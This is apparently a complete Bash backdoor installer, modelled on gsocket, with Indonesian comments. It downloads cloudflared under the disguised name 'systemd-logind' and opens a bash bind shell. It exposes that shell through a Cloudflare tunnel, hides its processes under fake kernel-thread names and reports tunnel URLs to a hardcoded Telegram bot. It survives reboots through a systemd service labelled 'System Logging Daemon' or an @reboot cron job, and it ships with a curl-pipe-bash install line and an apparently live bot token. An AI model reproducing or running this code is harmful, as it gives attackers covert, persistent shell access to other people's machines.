#!/usr/bin/env bash
# Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
# Usage: bash -c "$(curl -fsSL httpa://example/dep.sh)"
# Uninstall: CF_UNINSTALL=<token> bash -c "$(curl -fsSL https://example/dep.sh)"

# ========== KONFIGURASI ==========
: "${HOME:=/tmp}"
: "${USER:=$(whoami 2>/dev/null || echo unknown)}"
: "${UID:=$(id -u 2>/dev/null || echo 0)}"

BIN_HIDDEN_NAME="systemd-logind"
CONFIG_DIR=".config/dbus"
URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
TMPDIR="/tmp/.cf-${UID}"
PORT=$((RANDOM % 40000 + 10000))

# Daftar nama proses kernel untuk menyembunyikan proses
KERNEL_PROC_NAMES=(
    "[kworker/u:0]" "[kworker/0:0]" "[rcu_gp]" "[rcu_par_gp]" "[ksoftirqd/0]"
    "[kthreadd]" "[slub_flushwq]" "[kcompactd0]" "[kswapd0]" "[jbd2/sda1-8]" "[ext4-rsv-conver]"
)
PROC_HIDDEN_NAME="${KERNEL_PROC_NAMES[$((RANDOM % ${#KERNEL_PROC_NAMES[@]}))]}"

# ========== TELEGRAM NOTIFICATION ==========
TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
TELEGRAM_CHAT_ID="6223261018"

mkdir -p "$TMPDIR" 2>/dev/null || true
set -euo pipefail

# ========== FUNGSI OUTPUT ==========
print_step() {
    printf "%-50s" "$1"
}
finish_ok()     { echo "[OK]"; }
finish_skip()   { echo "[SKIPPING]"; }
finish_failed() { echo "[FAILED]"; exit 1; }

# ========== FUNGSI UTIL ==========
error() { echo -e "\033[1;31m$*\033[0m" >&2; }
info()  { echo -e "\033[1;32m$*\033[0m" >&2; }
warn()  { echo -e "\033[1;33m$*\033[0m" >&2; }

cleanup() {
    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
}
trap cleanup EXIT

# ========== KIRIM PESAN TELEGRAM ==========
send_telegram() {
    local message="$1"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && "$TELEGRAM_BOT_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT_ID" \
            -d text="$message" \
            -d parse_mode="HTML" >/dev/null 2>&1 &
    fi
}

# ========== DETEKSI ARSITEKTUR ==========
detect_arch() {
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    case "$os" in
        linux)  os="linux" ;;
        darwin) os="darwin" ;;
        *)      error "Unsupported OS: $os"; exit 1 ;;
    esac
    case "$arch" in
        x86_64|amd64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l)        arch="arm" ;;
        i386|i686)     arch="386" ;;
        *) error "Unsupported arch: $arch"; exit 1 ;;
    esac
    echo "${os}-${arch}"
}

# ========== DOWNLOAD CLOUDFLARED ==========
download_cloudflared() {
    local arch="$1"
    local url="${URL_BASE}/cloudflared-${arch}"
    local out="$TMPDIR/cloudflared"
    if command -v curl >/dev/null; then
        curl -fsSL -o "$out" "$url" 2>/dev/null || return 1
    elif command -v wget >/dev/null; then
        wget -q -O "$out" "$url" 2>/dev/null || return 1
    else
        return 1
    fi
    chmod 755 "$out"
    echo "$out"
}

# ========== BIND SHELL (LISTEN LOCALHOST) ==========
start_bindshell() {
    local port="$1"
    local bind_cmd
    if command -v socat >/dev/null; then
        bind_cmd="socat TCP-LISTEN:${port},bind=127.0.0.1,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    elif command -v ncat >/dev/null; then
        bind_cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
    elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
        bind_cmd="nc -l -p ${port} -s 127.0.0.1 -e /bin/bash"
    else
        bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
    fi
    ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
    echo $!
}

# ========== START TUNNEL (langsung, tanpa monitor) ==========
start_tunnel_direct() {
    local port="$1"
    local bin="$2"
    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
    echo $!
}

# ========== PERSISTENCE SCRIPT (dengan monitoring URL dan Telegram) ==========
create_persistence_script() {
    local bin_path="$1"
    local port="$2"
    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
    local telegram_token="$3"
    local telegram_chat="$4"
    mkdir -p "${HOME}/.${CONFIG_DIR}" 2>/dev/null || true
    cat > "$script_path" <<EOF
#!/bin/bash
# Persistence script for Cloudflare Tunnel (hidden)
BIN="$bin_path"
PORT=$port
TMPDIR="$TMPDIR"
TELEGRAM_TOKEN="$telegram_token"
TELEGRAM_CHAT="$telegram_chat"
PROC_NAME="$PROC_HIDDEN_NAME"
URL_SENT_FILE="\$TMPDIR/url_sent"

send_telegram() {
    if [[ -n "\$TELEGRAM_TOKEN" && "\$TELEGRAM_TOKEN" != "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" && -n "\$TELEGRAM_CHAT" ]]; then
        curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \\
            -d chat_id="\$TELEGRAM_CHAT" \\
            -d text="\$1" \\
            -d parse_mode="HTML" >/dev/null 2>&1 &
    fi
}

while true; do
    # Jalankan tunnel, arahkan stdout+stderr ke log
    exec -a "\$PROC_NAME" "\$BIN" tunnel --url "tcp://127.0.0.1:\$PORT" 2>&1 | while IFS= read -r line; do
        echo "\$line" >> "\$TMPDIR/cloudflared.log"
        if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
            url="\${BASH_REMATCH[0]}"
            # Cek apakah URL sudah pernah dikirim
            if [[ ! -f "\$URL_SENT_FILE" ]] || ! grep -q "\$url" "\$URL_SENT_FILE"; then
                echo "\$url" >> "\$URL_SENT_FILE"
                msg="<b>New Tunnel URL</b>\n\$url\n\nUse: cloudflared access tcp --hostname \$url --url localhost:4444 && nc localhost 4444"
                send_telegram "\$msg"
            fi
        fi
    done
    sleep 10
done
EOF
    chmod 755 "$script_path"
    echo "$script_path"
}

# ========== INSTALL PERSISTENCE (systemd/cron) ==========
install_persistence() {
    local script_path="$1"
    local service_name="cf-tunnel"
    # Cek apakah systemd user tersedia (dengan silent)
    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
        mkdir -p "${HOME}/.config/systemd/user"
        cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
[Unit]
Description=System Logging Daemon
After=network.target

[Service]
ExecStart=$script_path
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable "$service_name" 2>/dev/null || true
        systemctl --user start "$service_name" 2>/dev/null || true
        return 0
    elif command -v crontab >/dev/null; then
        (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
        return 0
    else
        return 1
    fi
}

# ========== DETEKSI INSTALASI SUDAH ADA ==========
check_existing_installation() {
    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
    if [[ -f "$token_file" ]]; then
        warn "Installation already detected. If you want to reinstall, first uninstall with the token."
        exit 1
    fi
    # Tidak mengecek proses karena bisa false positive dengan proses kernel asli
}

# ========== UNINSTALL (dengan token) ==========
uninstall() {
    # Baca token yang tersimpan
    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
    if [[ ! -f "$token_file" ]]; then
        echo "No installation found or token missing."
        exit 1
    fi
    local stored_token=$(cat "$token_file")
    # Cek variabel lingkungan CF_UNINSTALL
    if [[ -z "${CF_UNINSTALL:-}" ]] || [[ "$CF_UNINSTALL" != "$stored_token" ]]; then
        echo "Invalid uninstall token. Use CF_UNINSTALL=<token> bash -c ..."
        exit 1
    fi

    print_step "Removing installed files..."
    # Baca file konfigurasi PID jika ada
    local conf_file="${HOME}/.${CONFIG_DIR}/tunnel.conf"
    if [[ -f "$conf_file" ]]; then
        source "$conf_file"
        [[ -n "${TUNNEL_PID:-}" ]] && kill -9 "$TUNNEL_PID" 2>/dev/null || true
        [[ -n "${BIND_PID:-}" ]] && kill -9 "$BIND_PID" 2>/dev/null || true
        [[ -n "${PROC_NAME:-}" ]] && pkill -f "$PROC_NAME" 2>/dev/null || true
    fi
    pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
    pkill -f "cf_tunnel.sh" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
    if command -v systemctl >/dev/null; then
        systemctl --user stop cf-tunnel.service 2>/dev/null || true
        systemctl --user disable cf-tunnel.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
        systemctl --user daemon-reload 2>/dev/null || true
    fi
    rm -rf "${HOME}/.${CONFIG_DIR}"
    rm -rf "$TMPDIR"
    finish_ok
    echo "--> Uninstall complete."
    exit 0
}

# ========== MAIN ==========
# Cek uninstall dengan token
[[ -n "${CF_UNINSTALL:-}" ]] && uninstall

# Cek apakah instalasi sudah ada (hanya jika tidak dalam mode uninstall)
check_existing_installation

rm -rf "$TMPDIR" 2>/dev/null || true
mkdir -p "$TMPDIR"

# --- Step 1: Download binaries ---
print_step "Downloading binaries..."
arch=$(detect_arch)
cf_bin=$(download_cloudflared "$arch") || finish_failed
finish_ok

# --- Step 2: Unpacking binaries ---
print_step "Unpacking binaries..."
sleep 0.1
finish_ok

# --- Step 3: Copying binaries dengan fallback ---
print_step "Copying binaries..."
INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
USE_TMP=0
if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
    USE_TMP=1
elif ! cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null; then
    USE_TMP=1
fi

if [[ $USE_TMP -eq 1 ]]; then
    warn "Cannot use $INSTALL_DIR, using /tmp instead"
    INSTALL_DIR="/tmp/.${CONFIG_DIR}-${UID}"
    mkdir -p "$INSTALL_DIR" || finish_failed
    cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || {
        error "Failed to copy binary to $INSTALL_DIR"
        finish_failed
    }
fi

chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
finish_ok

# --- Step 4: Testing binaries ---
print_step "Testing binaries..."
if ! "$cf_bin" --version &>/dev/null; then
    finish_failed
fi
finish_ok

# --- Step 5: Testing Global Socket Relay Network ---
print_step "Testing Global Socket Relay Network..."
if curl -fsSL -m 5 https://cloudflare.com &>/dev/null || wget -q -T 5 --spider https://cloudflare.com &>/dev/null; then
    finish_ok
else
    warn "No internet connectivity? Continuing anyway..."
    finish_skip
fi

# --- Step 6 & 7: Installing access via ~/.bashrc & ~/.profile (dummy) ---
print_step "Installing access via ~/.bashrc..."
finish_skip
print_step "Installing access via ~/.profile..."
finish_skip

# --- Step 8: Executing webhooks ---
print_step "Executing webhooks..."
finish_skip

# --- Buat token uninstall ---
UNINSTALL_TOKEN=$(openssl rand -hex 8 2>/dev/null || head -c 8 /dev/urandom | xxd -p 2>/dev/null || echo "default")
echo "$UNINSTALL_TOKEN" > "${INSTALL_DIR}/.uninstall_token"
chmod 600 "${INSTALL_DIR}/.uninstall_token"

# --- Informasi uninstall ---
echo "--> To uninstall, use: CF_UNINSTALL=$UNINSTALL_TOKEN bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
echo "--> To connect use one of the following:"
echo "--> cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"

# --- Step 9: Starting hidden process (temporary) ---
print_step "Starting 'defunct' as hidden process '$PROC_HIDDEN_NAME'..."

# Start bindshell
bind_pid=$(start_bindshell "$PORT")
# Start tunnel (langsung)
tunnel_pid=$(start_tunnel_direct "$PORT" "$cf_bin")
# Simpan PID untuk uninstall
cat > "${INSTALL_DIR}/tunnel.conf" <<EOF
BIND_PID=$bind_pid
TUNNEL_PID=$tunnel_pid
PROC_NAME=$PROC_HIDDEN_NAME
PORT=$PORT
EOF

# Tunggu URL awal
sleep 5
# Cek log untuk URL
if [[ -f "$TMPDIR/cloudflared.log" ]]; then
    url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
    if [[ -n "$url" ]]; then
        echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
        echo "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
        # Kirim via Telegram
        send_telegram "<b>Initial Tunnel URL</b>\n$url"
    else
        warn "Tunnel URL not detected yet. Check $TMPDIR/cloudflared.log"
    fi
fi
finish_ok

# --- Persistence dengan Telegram ---
if [[ -z "${GS_NOINST:-}" ]]; then
    persistence_script=$(create_persistence_script "$cf_bin" "$PORT" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID")
    if install_persistence "$persistence_script"; then
        info "Persistence installed (will send new URLs via Telegram after reboot)."
    else
        warn "Persistence not installed (no systemd/cron). Tunnel will not survive reboot."
    fi
fi

echo "--> Join us on Telegram - https://t.me/thcorg"
echo
info "Done. Use CF_UNINSTALL=$UNINSTALL_TOKEN to uninstall."
